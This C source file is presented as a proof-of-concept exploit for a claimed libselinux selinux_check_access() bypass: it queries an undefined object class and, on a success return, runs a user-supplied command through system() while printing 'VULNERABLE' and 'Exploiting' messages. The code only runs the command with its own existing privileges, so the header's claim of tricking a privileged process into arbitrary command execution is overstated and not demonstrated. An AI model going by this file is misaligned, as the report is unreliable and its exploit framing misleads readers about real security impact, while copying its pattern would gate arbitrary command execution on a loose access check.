/*
 * poc.c
 * Proof-of-Concept for libselinux selinux_check_access() permission bypass
 * 
 * Compile: gcc -o poc poc.c -lselinux
 * Usage:   ./poc [command]
 *          Default command is "whoami"
 * 
 * This PoC demonstrates that when selinux_check_access() is called with
 * an invalid object class (not defined in policy), and the system's
 * deny_unknown setting is 0 (default on many distributions), the function
 * returns 0 (success), allowing arbitrary command execution by tricking
 * a privileged process into believing the access check passed.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/wait.h>
#include <selinux/selinux.h>

#define DEFAULT_CMD "whoami"

/* Get current process SELinux contexts */
static int get_current_contexts(char **scon, char **tcon) {
    if (getcon(scon) < 0) {
        perror("getcon");
        return -1;
    }
    *tcon = strdup(*scon);
    if (!*tcon) {
        perror("strdup");
        freecon(*scon);
        return -1;
    }
    return 0;
}

/* Read and print deny_unknown status (informational only) */
static void print_deny_unknown_status(void) {
    FILE *fp = fopen("/sys/fs/selinux/deny_unknown", "r");
    if (fp) {
        int val;
        if (fscanf(fp, "%d", &val) == 1)
            printf("[*] deny_unknown = %d\n", val);
        fclose(fp);
    } else {
        printf("[*] Could not read /sys/fs/selinux/deny_unknown (permission denied or not available)\n");
    }
}

int main(int argc, char **argv) {
    char *scon = NULL, *tcon = NULL;
    int rc;
    const char *cmd = (argc > 1) ? argv[1] : DEFAULT_CMD;

    /* Obtain current SELinux context */
    if (get_current_contexts(&scon, &tcon) != 0)
        return 1;

    printf("[*] Current context: %s\n", scon);
    print_deny_unknown_status();

    /* Craft an invalid class name that does not exist in policy */
    const char *invalid_class = "invalid_class_xyz";
    const char *perm = "whatever";

    printf("[*] Calling selinux_check_access() with invalid class '%s'...\n", invalid_class);

    errno = 0;
    rc = selinux_check_access(scon, tcon, invalid_class, perm, NULL);

    if (rc == 0) {
        printf("[!] VULNERABLE: selinux_check_access returned 0 (success).\n");
        printf("[!] Exploiting to execute command: %s\n", cmd);

        int status = system(cmd);
        if (status == -1) {
            perror("system");
        } else {
            if (WIFEXITED(status)) {
                printf("[+] Command executed successfully (exit code: %d)\n", WEXITSTATUS(status));
            } else if (WIFSIGNALED(status)) {
                printf("[!] Command terminated by signal: %d\n", WTERMSIG(status));
            } else {
                printf("[!] Command terminated abnormally\n");
            }
        }
    } else {
        printf("[+] NOT vulnerable: selinux_check_access returned -1 (failure).\n");
        printf("[+] Cannot exploit. Error: %s\n", strerror(errno));
    }

    freecon(scon);
    free(tcon);
    return 0;
}